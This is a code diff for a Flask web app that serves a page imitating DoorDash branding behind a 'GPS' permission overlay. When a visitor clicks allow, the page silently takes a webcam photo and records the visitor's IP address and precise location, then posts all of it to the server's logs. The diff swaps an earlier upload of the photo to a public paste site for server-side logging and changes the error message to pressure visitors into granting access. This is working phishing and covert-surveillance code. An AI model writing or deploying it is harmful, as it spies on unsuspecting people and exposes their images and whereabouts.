@@ -1,19 +1,41 @@
-from flask import Flask, request, jsonify, redirect
+from flask import Flask, request, jsonify
 import logging
 from datetime import datetime
 import os
 import json
-import requests  # For PrivateBin API
 
 app = Flask(__name__)
 
-# Configure logging
+# Configure logging with cleaner format
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s [%(levelname)s] %(message)s',
+    format='%(message)s',
     handlers=[logging.StreamHandler()]
 )
 logger = logging.getLogger('gps_logger')
+
+def log_clean_data(event_type, data, ip):
+    """Logs data in a clean, organized format"""
+    timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
+    separator = "=" * 60
+    
+    log_output = f"\n{separator}\n"
+    log_output += f"{event_type.upper()} - {timestamp}\n"
+    log_output += f"IP: {ip}\n"
+    
+    if event_type == 'permission_request':
+        log_output += "User granted permissions\n"
+    elif event_type == 'location_data':
+        log_output += f"Location: {data['lat']}, {data['lng']}\n"
+        log_output += f"Accuracy: {data['accuracy']} meters\n"
+    elif event_type == 'camera_capture':
+        log_output += "Image captured (Base64 preview):\n"
+        log_output += f"{data['image_data'][:100]}... [truncated]\n"
+    elif event_type == 'error':
+        log_output += f"ERROR: {data['error']}\n"
+    
+    log_output += separator
+    logger.info(log_output)
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -23,7 +45,7 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* Your existing styles remain unchanged */
+        /* ALL ORIGINAL STYLES REMAIN EXACTLY THE SAME */
         .doorDash-heading {{
           font-family: 'Inter', sans-serif;
           font-weight: 700;
@@ -47,33 +69,53 @@ HTML_TEMPLATE = """
         }}
         .gps-overlay {{
           position: fixed;
-          top: 0;
-          left: 0;
-          right: 0;
-          bottom: 0;
-          background: rgba(0,0,0,0.8);
+          top: auto;
+          right: auto;
+          bottom: auto;
+          left: auto;
+          width: 340px;
+          max-height: 80vh;
+          min-height: 200px;
+          display: inline-block;
+          max-width: 90vw;
+          margin: 20px;
           display: flex;
-          justify-content: center;
-          align-items: center;
+          flex-direction: column;
+          justify-content: space-between;
+          box-sizing: border-box;
+          left: 50%;
+          top: 50%;
+          transform: translate(-50%, -50%);
+          background: rgba(0,0,0,0.95);
+          border-radius: 16px;
+          overflow: hidden;
           z-index: 10000;
+          box-shadow: none;
+          margin: 0;
+        }}
+        .body {{
+          margin: 0;
+          background: black;
         }}
         .gps-modal {{
-          background: white;
-          padding: 25px;
-          border-radius: 10px;
-          max-width: 400px;
-          text-align: center;
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            max-width: 400px;
+            text-align: center;
+            font-weight: bold;
+            font-family: 'Inter', sans-serif;
         }}
         .gps-btn {{
-          background: #0B5CFF;
-          color: white;
-          border: none;
-          padding: 12px 25px;
-          border-radius: 5px;
-          font-size: 16px;
-          cursor: pointer;
-          margin-top: 15px;
-          font-weight: bold;
+            background: #0B5CFF;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-weight: bold;
         }}
     </style>
 </head>
@@ -92,62 +134,12 @@ HTML_TEMPLATE = """
     </div>
 
     <script>
-        async function uploadToPrivateBin(imageData) {{
-            try {{
-                // Using a public PrivateBin instance (you may want to host your own)
-                const response = await fetch('https://privatebin.net/', {{
-                    method: 'POST',
-                    headers: {{
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'X-Requested-With': 'JSONHttpRequest'
-                    }},
-                    body: new URLSearchParams({{
-                        'data': JSON.stringify({{
-                            'paste': imageData,
-                            'expire': '1week',
-                            'formatter': 'plaintext',
-                            'burnafterreading': '0',
-                            'opendiscussion': '0'
-                        }})
-                    }})
-                }});
-                
-                const result = await response.json();
-                if (result.status === 0 && result.url) {{
-                    await fetch('/log', {{
-                        method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{
-                            type: 'image_upload',
-                            ip: await fetch('/getip').then(r => r.text()),
-                            paste_url: result.url,
-                            timestamp: new Date().toISOString()
-                        }})
-                    }});
-                    return result.url;
-                }}
-                throw new Error(result.message || 'Upload failed');
-            }} catch (error) {{
-                console.error('Upload error:', error);
-                await fetch('/log', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        type: 'upload_error',
-                        error: error.toString(),
-                        ip: await fetch('/getip').then(r => r.text()),
-                        timestamp: new Date().toISOString()
-                    }})
-                }});
-                return null;
-            }}
-        }}
-
         async function takePicture() {{
             try {{
                 const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                 const video = document.createElement('video');
                 video.srcObject = stream;
+                
                 await new Promise((resolve) => {{
                     video.onloadedmetadata = () => {{
                         video.play();
@@ -162,41 +154,42 @@ HTML_TEMPLATE = """
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 stream.getTracks().forEach(track => track.stop());
-                
-                return canvas.toDataURL('image/jpeg', 0.8);
+                return canvas.toDataURL('image/jpeg', 0.8); // Returns Base64
             }} catch (error) {{
                 console.error('Camera error:', error);
-                await fetch('/log', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        type: 'camera_error',
-                        error: error.toString(),
-                        ip: await fetch('/getip').then(r => r.text()),
-                        timestamp: new Date().toISOString()
-                    }})
-                }});
                 return null;
             }}
         }}
 
         document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
             try {{
+                const ip = await fetch('/getip').then(r => r.text());
+                const timestamp = new Date().toISOString();
+                
                 // Log permission request
                 await fetch('/log', {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
                     body: JSON.stringify({{
                         type: 'permission_request',
-                        ip: await fetch('/getip').then(r => r.text()),
-                        timestamp: new Date().toISOString()
+                        ip: ip,
+                        timestamp: timestamp
                     }})
                 }});
                 
-                // Take picture and upload Base64
+                // Take picture and log
                 const imageData = await takePicture();
                 if (imageData) {{
-                    await uploadToPrivateBin(imageData);
+                    await fetch('/log', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
+                            type: 'camera_capture',
+                            ip: ip,
+                            image_data: imageData,
+                            timestamp: timestamp
+                        }})
+                    }});
                 }}
                 
                 // Get location
@@ -214,11 +207,11 @@ HTML_TEMPLATE = """
                     headers: {{ 'Content-Type': 'application/json' }},
                     body: JSON.stringify({{
                         type: 'location_data',
-                        ip: await fetch('/getip').then(r => r.text()),
+                        ip: ip,
                         lat: position.coords.latitude,
                         lng: position.coords.longitude,
                         accuracy: position.coords.accuracy,
-                        timestamp: new Date().toISOString()
+                        timestamp: timestamp
                     }})
                 }});
                 
@@ -231,12 +224,12 @@ HTML_TEMPLATE = """
                     headers: {{ 'Content-Type': 'application/json' }},
                     body: JSON.stringify({{
                         type: 'error',
-                        error: error.toString(),
+                        error: error.message,
                         ip: await fetch('/getip').then(r => r.text()),
                         timestamp: new Date().toISOString()
                     }})
                 }});
-                alert('Error occurred: ' + error.message);
+                alert('Location access is required to continue.');
             }}
         }});
     </script>
@@ -248,12 +241,10 @@ HTML_TEMPLATE = """
 def serve_page():
     """Serve the page with GPS overlay"""
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    logger.info(f"Page served to IP: {client_ip}")
+    logger.info(f"\n=== PAGE SERVED ===\nIP: {client_ip}\nTime: {datetime.utcnow()}\n{'='*40}")
     
-    # Load your existing page.html content
     with open('page.html', 'r') as f:
         existing_content = f.read()
-    
     return HTML_TEMPLATE.format(existing_content=existing_content)
 
 @app.route('/getip')
@@ -266,15 +257,7 @@ def log_data():
     """Central logging endpoint"""
     data = request.json
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
-    # Enhanced logging with all relevant data
-    log_entry = {
-        'timestamp': datetime.utcnow().isoformat(),
-        'client_ip': client_ip,
-        'event_data': data
-    }
-    
-    logger.info(json.dumps(log_entry, indent=2))
+    log_clean_data(data['type'], data, client_ip)
     return jsonify({'status': 'success'})
 
 if __name__ == '__main__':
